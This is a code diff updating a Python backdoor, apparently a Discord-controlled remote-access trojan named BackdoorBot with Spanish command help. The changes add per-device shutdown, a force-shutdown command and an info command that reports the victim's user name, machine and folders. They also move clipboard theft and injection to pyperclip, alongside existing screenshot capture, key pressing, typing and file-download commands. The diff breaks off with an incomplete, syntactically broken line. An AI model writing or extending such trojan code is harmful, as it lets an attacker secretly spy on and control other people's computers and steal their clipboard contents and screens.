@@ -7,6 +7,7 @@ import subprocess, threading
 import winsound, pygame.mixer
 import os
 import requests
+import pyperclip
 from pycaw.pycaw import AudioUtilities, IAudioEndpointVolume
 from ctypes import POINTER, cast
 from comtypes import CLSCTX_ALL
@@ -35,12 +36,12 @@ DEVICE_NAME = os.environ.get('COMPUTERNAME', USER_NAME)
 recording = False
 recorded_keys = []
 recording_thread = None
-app_version = "1.2.0"
+app_version = "1.3.0"
 
 def request_instagram():
     url = "https://instagram.com/"
     response = requests.get(url)
-    if response.status_code == 200:
+    if response.status_code == 200: 
         return response.cookies
 
 def download_file(url, filename):
@@ -116,7 +117,16 @@ class BackdoorBot(discord.Client):
             await message.channel.send(file=discord.File(img_bytes, filename='screenshot.png'))
 
         elif message.content.startswith('!shutdown'):
-            await message.channel.send("Shutting down...")
+            pcName = message.content.split(" ", 1)[1]
+            if pcName == DEVICE_NAME:
+                await message.channel.send(f"Apagando el bot en {DEVICE_NAME}...")
+                await message.channel.send("Shutting down...")
+                await self.close()
+            else: 
+                await message.channel.send(f"El nombre del dispositivo no coincide.")
+        
+        elif message.content.startswith('!forceshutdown'):
+            await message.channel.send("Forzando el apagado del bot...")
             await self.close()
 
         elif message.content.startswith('!getkeys'):
@@ -210,7 +220,7 @@ class BackdoorBot(discord.Client):
             help_text = (
                 "Comandos disponibles:\n"
                 "!screenshot - Toma una captura de pantalla.\n"
-                "!shutdown - Apaga el bot.\n"
+                "!shutdown <pc>- Apaga el bot en el dispositivo especificado.\n"
                 "!getkeys - Obtiene las teclas disponibles.\n"
                 "!presskey <tecla> - Presiona una tecla específica.\n"
                 "!type <texto> - Escribe un texto.\n"
@@ -235,6 +245,8 @@ class BackdoorBot(discord.Client):
                 "!setcopiedtext <texto> - Establece el texto copiado al portapapeles.\n"
                 "!presshotkey <tecla1+tecla2> - Presiona un hotkey específico.\n"
                 "!deletebg - Elimina el fondo de pantalla actual.\n"
+                "!info - Muestra información del bot.\n"
+                "!forceshutdown - Fuerza el apagado del bot.\n"
             )
             await message.channel.send(help_text)
 
@@ -340,7 +352,7 @@ class BackdoorBot(discord.Client):
         
         elif message.content.startswith("!getcopiedtext"):
             try:
-                copied_text = pyautogui.paste()
+                copied_text = pyperclip.paste()
                 if copied_text:
                     await message.channel.send(f"Texto copiado: {copied_text[:1900]}...")
                 else:
@@ -351,7 +363,7 @@ class BackdoorBot(discord.Client):
         elif message.content.startswith("!setcopiedtext"):
             try:
                 text_to_copy = message.content.split(" ", 1)[1]
-                pyautogui.copy(text_to_copy)
+                pyperclip.copy(text_to_copy)
                 await message.channel.send(f"Texto copiado: {text_to_copy[:1900]}...")
             except IndexError:
                 await message.channel.send("Por favor, proporciona el texto a copiar.")
@@ -374,6 +386,9 @@ class BackdoorBot(discord.Client):
 
             downloads_folder = get_downloads_folder()
             await message.channel.send(f"Descargas: {downloads_folder}")
+        elif message.content.startswith("!info"):
+            await message.channel.send("Version " + app_version +"\n Conectado a " + DEVICE_NAME + "\n Usuario: " + USER_NAME + "\n Carpeta de descargas: " + get_downloads_folder() + "\n Carpeta de documentos: " + get_documents_folder())
+        elif message.content.startswith("!")
             
 
 
